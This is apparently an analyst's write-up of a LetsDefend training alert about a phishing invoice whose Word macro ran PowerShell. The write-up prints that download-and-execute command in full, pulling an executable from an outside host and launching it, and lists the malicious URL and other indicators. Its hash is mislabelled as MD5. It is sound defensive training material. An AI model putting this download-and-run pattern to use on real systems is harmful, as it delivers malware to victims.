# SOC205 | Malicious Macro Has Been Executed

**Platform:** LetsDefend
**Date Investigated:** February 28, 2024
**Severity:** Medium
**Verdict:** True Positive ✅
**Actions Taken:** Endpoint contained

## Summary

A malicious Word document disguised as an invoice was delivered via email and opened by a user on February 28, 2024 at 08:41 AM. One minute later at 08:42 AM, a macro embedded in the document executed a PowerShell command that downloaded and ran a malicious executable from an external server. The file hash was flagged by 30 out of 65 security vendors on VirusTotal. The endpoint was contained after the malware was confirmed to have executed.

## Alert Details

| Field | Value |
| --- | --- |
| Event ID | 231 |
| Event Time | Feb 28, 2024, 08:42 AM |
| Rule | SOC205, Malicious Macro has been executed |
| Sender | jake.admin@cybercommunity.info |
| File | edit1-invoice.docm.zip |
| File Hash, MD5 | 1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0 |
| VT Detection | 30/65 vendors flagged as malicious |
| Download URL | http://www.greyhathacker.net/tools/messbox.exe |

## The Delivery

The email came from jake.admin@cybercommunity.info, a sender with no legitimate business association. The attachment was named edit1-invoice.docm.zip, a classic double-extension trick. The .zip wrapping allows the file to pass through some email filters that block .docm files directly. Once unzipped, the .docm file is a macro-enabled Word document, the format that allows embedded macros to run on open.

The invoice theme is deliberate social engineering. People expect invoices to require action and tend to open them without as much hesitation as they might apply to other unsolicited attachments.

## The Macro and What It Did

Once the document was opened, the embedded macro executed the following PowerShell command:

```powershell
(New-Object System.Net.WebClient).DownloadFile(
  'http://www.greyhathacker.net/tools/messbox.exe',
  'mess.exe'
);
Start-Process 'mess.exe'
```

This is a two-step command. The first part uses PowerShell's built-in WebClient class to download messbox.exe from greyhathacker.net and save it locally as mess.exe. The second part immediately runs it. The entire download and execution chain happens within the same command, meaning there is essentially no gap between the file landing on disk and it running.

The one minute gap between the document being opened at 08:41 and the macro executing at 08:42 is consistent with the time it takes for Word to load and prompt the user to enable macros, combined with the user clicking Enable Content.

## Hash Reputation Check

The MD5 hash returned a 30 out of 65 detection ratio on VirusTotal. That is close to half of all major engines flagging it, which combined with the observed PowerShell execution chain and the download from a domain with no legitimate standing is more than enough to confirm the file as malicious.

## Why This Macro Technique Is Common

The WebClient.DownloadFile pattern is one of the most frequently seen macro-based payload delivery methods because it is simple, reliable, and built into Windows itself. It does not require any external tools or libraries, it uses a class that is already part of the .NET framework on every Windows machine. Defenders cannot simply block PowerShell without breaking a significant amount of legitimate functionality, which is why this technique remains effective even in fairly well-defended environments.

The greyhathacker.net domain name is also worth flagging as an obvious indicator. Real malware campaigns often use compromised legitimate sites or algorithmically generated domains. A domain literally named greyhathacker is either a test environment or an attacker who is not particularly concerned about subtlety.

## MITRE ATT&CK Mapping

| Technique | ID | Description |
| --- | --- | --- |
| Spearphishing Attachment | T1566.001 | Malicious .docm.zip delivered via email |
| User Execution, Malicious File | T1204.002 | User opened the document and enabled macros |
| Command and Scripting Interpreter, PowerShell | T1059.001 | Macro executed PowerShell to download payload |
| Ingress Tool Transfer | T1105 | messbox.exe downloaded from greyhathacker.net |

## Playbook Answers

- ✅ Check If Someone Requested the C2
- ✅ Analyze Malware
- ✅ Check if the Malware is Quarantined and Cleaned

## Verdict and Closing Rationale

True Positive. A macro-enabled Word document was delivered via phishing email, the user enabled macros, and a PowerShell command immediately downloaded and executed a malicious payload. The hash is confirmed malicious, the download domain has no legitimate standing, and the execution chain is clearly visible in the endpoint logs. The endpoint was contained.

## Takeaway for Future Cases

The one minute gap between file open and macro execution is a useful timing signal in cases like this. In macro-based infections that require the user to click Enable Content, that gap reflects human interaction time. In cases where macros run automatically without a prompt, that gap disappears entirely. Knowing which you are dealing with tells you something about the document's configuration and how much the attack relied on user interaction versus automatic execution. The PowerShell WebClient pattern itself is worth memorising since it shows up constantly in macro-based delivery chains, the syntax varies slightly but the structure of DownloadFile followed by Start-Process or Invoke-Expression is one of the most repeated patterns in commodity malware delivery.
